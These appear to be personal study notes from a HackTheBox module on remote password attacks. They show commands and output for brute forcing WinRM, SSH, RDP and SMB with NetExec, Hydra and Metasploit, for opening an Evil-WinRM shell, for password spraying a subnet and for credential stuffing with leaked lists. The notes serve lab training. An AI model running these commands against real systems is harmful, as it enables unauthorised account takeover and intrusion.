---
Title: HTB\Password Attacks\Remote Password Attacks
tags:
  - os/windows
  - os/linux- cybersec
source: HTB\Password Attacks\Remote Password Attacks
---

# HTB\Password Attacks\Remote Password Attacks

> Źródło: `HTB\Password Attacks\Remote Password Attacks`

### WinRM
Windows Remote Management (WinRM) is the Microsoft implementation of the Web Services Management Protocol (WS-Management).
It is a network protocol based on XML web services using the Simple Object Access Protocol (SOAP) used for remote management of Windows systems.
It takes care of the communication between Web-Based Enterprise Management (WBEM) and the Windows Management Instrumentation (WMI),
which can call the Distributed Component Object Model (DCOM).
By default, WinRM uses the TCP ports 5985 (HTTP) and 5986 (HTTPS).

A handy tool that we can use for our password attacks is NetExec (https://github.com/Pennyw0rth/NetExec),
which can also be used for other protocols such as SMB, LDAP, MSSQL, and others.
We recommend reading the official documentation(https://www.netexec.wiki/) for this tool to become familiar with it.

### NetExec
The general format for using NetExec is as follows:
```bash
Ovas420@htb[/htb]$ netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```


As an example, this is what attacking a WinRM endpoint might look like:
```bash
Ovas420@htb[/htb]$ netexec winrm 10.129.42.197 -u user.list -p password.list



WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
```
The appearance of (Pwn3d!) is the sign that we can most likely execute system commands if we log in with the brute-forced user.
Another handy tool that we can use to communicate with the WinRM service is Evil-WinRM (https://github.com/Hackplayers/evil-winrm),
which allows us to communicate with the WinRM service efficiently.

Evil-WinRM Usage
```bash
Ovas420@htb[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>
Ovas420@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password
Evil-WinRM shell v3.3
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\user\Documents>
```

If the login was successful, a terminal session is initialized using the Powershell Remoting Protocol (MS-PSRP), which simplifies the operation and execution of commands.

### SSH
This service uses three different cryptography operations/methods: symmetric encryption, asymmetric encryption, and hashing.
Symmetric encryption uses the same key for encryption and decryption. Anyone who has access to the key could also access the transmitted data.
Therefore, a key exchange procedure is needed for secure symmetric encryption.
The Diffie-Hellman key exchange method is used for this purpose.

Asymmetric encryption uses two keys: a private key and a public key.
The private key must remain secret because only it can decrypt the messages that have been encrypted with the public key.

The hashing method converts the transmitted data into another unique value.
SSH uses hashing to confirm the authenticity of messages. This is a mathematical algorithm that only works in one direction.

We can use a tool like Hydra to brute force SSH.
Ovas420@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197

To log in to the system via the SSH protocol, we can use the OpenSSH client, which is available by default on most Linux distributions.
Ovas420@htb[/htb]$ ssh user@10.129.42.197

RDP
Microsoft's Remote Desktop Protocol (RDP) is a network protocol that allows remote access to Windows systems via TCP port 3389 by default.
RDP provides both users and administrators/support staff with remote access to Windows hosts within an organization

We can also use Hydra to perform RDP bruteforcing.
```bash
Ovas420@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197
```


Linux offers different clients to communicate with the desired server using the RDP protocol.
These include Remmina, xfreerdp, and many others. For our purposes, we will work with xfreerdp.

### xFreeRDP
```bash
xfreerdp /v:<target-IP> /u:<username> /p:<password>
```

### SMB
Server Message Block (SMB) is a protocol responsible for transferring data between a client and a server in local area networks.
It is used to implement file and directory sharing and printing services in Windows networks.
SMB is often referred to as a file system, but it is not. SMB can be compared to NFS for Unix and Linux for providing drives on local networks.

SMB is also known as Common Internet File System (CIFS).
It is part of the SMB protocol and enables universal remote connection of multiple platforms such as Windows, Linux, or macOS.
In addition, we will often encounter Samba, which is an open-source implementation of the above functions.
For SMB, we can also use hydra again to try different usernames in combination with different passwords.

### Hydra - SMB
```bash
Ovas420@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197
```

However, we may also get the following error describing that the server has sent an invalid reply.
```bash
[ERROR] invalid reply from target smb://10.129.42.197:445/
```

This is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies.
To work around this problem, we can manually update and recompile hydra or use another very powerful tool, the Metasploit framework.

### Metasploit
```bash
Ovas420@htb[/htb]$ msfconsole -q
msf6 > use auxiliary/scanner/smb/smb_login
```


Now we can use NetExec again to view the available shares and what privileges we have for them.
```bash
Ovas420@htb[/htb]$ netexec smb 10.129.42.197 -u "user" -p "password" --shares

SMB         10.129.42.197   445    WINSRV           [*] Windows 10.0 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:False)
SMB         10.129.42.197   445    WINSRV           [+] WINSRV\user:password
SMB         10.129.42.197   445    WINSRV           [+] Enumerated shares
SMB         10.129.42.197   445    WINSRV           Share           Permissions     Remark
SMB         10.129.42.197   445    WINSRV           -----           -----------     ------
SMB         10.129.42.197   445    WINSRV           ADMIN$                          Remote Admin
SMB         10.129.42.197   445    WINSRV           C$                              Default share
SMB         10.129.42.197   445    WINSRV           SHARENAME       READ,WRITE
SMB         10.129.42.197   445    WINSRV           IPC$            READ            Remote IPC
```


To communicate with the server via SMB, we can use, for example, the tool smbclient(https://www.samba.org/samba/docs/current/man-html/smbclient.1.html).
This tool will allow us to view the contents of the shares, upload, or download files if our privileges allow it.
```bash
Ovas420@htb[/htb]$ smbclient -U user \\\\10.129.42.197\\SHARENAME
```

Spraying Stuffing and Defaults
Password spraying is a type of brute-force attack in which an attacker attempts to use a single password across many different user accounts.
This technique can be particularly effective in environments where users are initialized with a default or standard password.
For example, if it is known that administrators at a particular company commonly use ChangeMe123! when setting up new accounts,
it would be worthwhile to spray this password across all user accounts to identify any that were not updated.

Depending on the target system, different tools may be used to carry out password spraying attacks.
For web applications, Burp Suite is a strong option, while for Active Directory environments, tools such as NetExec or Kerbrute are commonly used.

```bash
netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'
```


Credential stuffing is another type of brute-force attack in which an attacker uses stolen credentials from one service to attempt access on others.
Since many users reuse their usernames and passwords across multiple platforms (such as email, social media, and enterprise systems), these attacks are sometimes successful.
As with password spraying, credential stuffing can be carried out using a variety of tools, depending on the target system.
For example, if we have a list of username:password credentials obtained from a database leak,
we can use hydra to perform a credential stuffing attack against an SSH service using the following syntax:
```bash
Ovas420@htb[/htb]$ hydra -C user_pass.list ssh://10.100.38.23
```


Many systems—such as routers, firewalls, and databases—come with default credentials.
While best practice dictates that administrators change these credentials during setup, they are sometimes left unchanged, posing a serious security risk.
While several lists of known default credentials are available online, there are also dedicated tools that automate the process.
One widely used example is the Default Credentials Cheat Sheet, which we can install with pip3.
```bash
Ovas420@htb[/htb]$ pip3 install defaultcreds-cheat-sheet
```

Once installed, we can use the creds command to search for known default credentials associated with a specific product or vendor.

```bash
Ovas420@htb[/htb]$ creds search linksys
```


Default credentials cheat list: https://github.com/ihebski/DefaultCreds-cheat-sheet

**Powiązane:** [[Graph-Home]] [[OS-Windows]] [[OS-Linux]]
